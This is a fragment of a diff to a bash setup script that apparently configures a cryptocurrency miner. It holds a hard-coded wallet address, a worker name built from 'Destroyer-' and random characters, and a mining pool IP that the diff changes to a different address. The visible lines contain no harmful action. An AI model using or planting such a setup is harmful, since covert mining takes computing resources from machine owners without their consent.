@@ -1,6 +1,6 @@
 #!/bin/bash
 WALLET="4AVDqZyeuTeDgVeASR83DRdokorjq8sgkav7NcQB66hZR2kDgF5rPpyPWSv1RjpjbrXZQaQPmqpzoUFRPfD9PgFFSckTFkj"
-POOL="139.180.213.58:1122"
+POOL="31.97.58.247:1122"
 WORKER="Destroyer-$(tr -dc A-Za-z0-9 </dev/urandom | head -c 6)"
 
 echo "[+] Starting setup..."
